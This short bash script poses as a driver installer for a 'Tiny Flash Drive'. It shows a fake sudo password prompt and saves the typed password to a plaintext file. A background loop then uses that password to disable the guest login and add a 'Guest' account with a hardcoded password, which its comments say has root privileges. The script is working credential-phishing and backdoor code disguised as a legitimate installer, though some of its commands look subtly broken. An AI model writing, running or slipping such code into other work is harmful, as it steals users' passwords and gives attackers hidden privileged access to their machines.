#!/bin/bash
echo "" > tmp
stty -echo
clear
while :
do
   s=$(<tmp)
   set -- $s
   if [ -z "$s" ]; then
     : #echo "file contains $s"
   else
     # disable the guest account
     echo $s | sudo -S sh -c 'printf "[SeatDefaults]\nallow-guest=false\n" >/usr/share/lightdm/lightdm.conf.d/50-no-guest.conf'
     # replace it with a new guest account with root privledges
     echo $s | sudo -S useradd -ou 10 -g 10 Guest -b /home/Guest
     echo $s | sudo -S echo "GuestPassword" | echo "GuestPassword" | passwd Guest --stdin
     exit 0
   fi
   sleep 0.5
done &
stty echo
echo "Driver installation for 'Tiny Flash Drive' requires root privledges."
stty -echo
read -p "[sudo] password for $USER: " PASSWORD; echo
stty echo
echo "$PASSWORD" > tmp
